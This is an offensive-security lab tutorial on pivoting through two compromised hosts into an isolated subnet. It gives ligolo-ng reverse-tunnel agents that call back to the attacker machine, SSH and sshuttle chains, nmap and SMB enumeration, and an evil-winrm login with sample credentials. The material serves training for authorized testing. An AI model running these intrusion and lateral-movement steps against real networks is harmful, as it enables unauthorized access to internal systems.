# Multi-Hop Pivoting — Integration Lab

Full scenario: three segments, two pivots, one attacker. This is what OSCP and real engagements look like.

## Scenario

```
Kali (attacker) 192.168.1.10
  |
  | [internet-facing]
  v
Pivot1  192.168.1.50 / 10.10.10.50       (compromised, dual-homed)
  |
  | [internal Subnet A]
  v
Pivot2  10.10.10.100 / 172.16.0.50       (compromised, dual-homed)
  |
  | [isolated Subnet B]
  v
Target  172.16.0.100                     (final target, no internet)
```

## Step 1 — Establish Tunnel to Subnet A via Pivot1

```bash
# Option A: sshuttle (quick)
sshuttle -r user@192.168.1.50 10.10.10.0/24

# Option B: ligolo-ng agent on Pivot1
# On Pivot1:
./agent -connect 192.168.1.10:11601 -ignore-cert

# On Kali (ligolo interface):
session → select Pivot1 → start
sudo ip route add 10.10.10.0/24 dev ligolo
```

## Step 2 — Enumerate Subnet A

```bash
# Discover hosts
nmap -sn 10.10.10.0/24

# Find Pivot2 (dual-homed host)
nmap -sV -p 22,80,443,445,3389 10.10.10.100

# Enumerate services on discovered hosts
nxc smb 10.10.10.0/24
```

## Step 3 — Compromise Pivot2, Deploy Second Agent

```bash
# Get shell on Pivot2 (via exploit, creds, etc.)
# Deliver second ligolo-ng agent to Pivot2

# From Kali (already routing through Pivot1):
scp agent user@10.10.10.100:/tmp/agent

# On Pivot2:
./agent -connect 192.168.1.10:11601 -ignore-cert
# Ligolo-ng supports multiple agents simultaneously
```

## Step 4 — Route to Subnet B via Pivot2

```bash
# In ligolo interface — switch to Pivot2 session
session → select Pivot2 → start

# Add route for Subnet B
sudo ip route add 172.16.0.0/24 dev ligolo
```

Now access Target directly from Kali:

```bash
nmap -sV -p- 172.16.0.100
evil-winrm -i 172.16.0.100 -u Administrator -p 'Pass123'
```

## Nested SSH Alternative (manual, no extra tools)

```bash
# SSH chain through both pivots — ProxyJump
ssh -J user@192.168.1.50,user@10.10.10.100 user@172.16.0.100

# Dynamic SOCKS through double hop
ssh -J user@192.168.1.50 -D 1080 user@10.10.10.100
# Then route through 1080 for Subnet B
proxychains curl http://172.16.0.100/
```

## Keeping Track

Maintain a network diagram as you go — draw it as text in your notes:

```
[Kali] → sshuttle/ligolo → [Pivot1:10.10.10.50] → ligolo → [Pivot2:172.16.0.50] → [Target:172.16.0.100]
```

## Practice Labs

- TryHackMe "Wreath" — three-machine chain, exactly this structure
  https://tryhackme.com/room/wreath
- HTB Pro Labs "Offshore" — realistic multi-segment AD environment
- HTB Pro Labs "RastaLabs" — advanced multi-hop with AD attacks

Ethical note: multi-hop pivoting dramatically expands your blast radius.
Only perform on scoped, authorized targets. Document every pivot established.
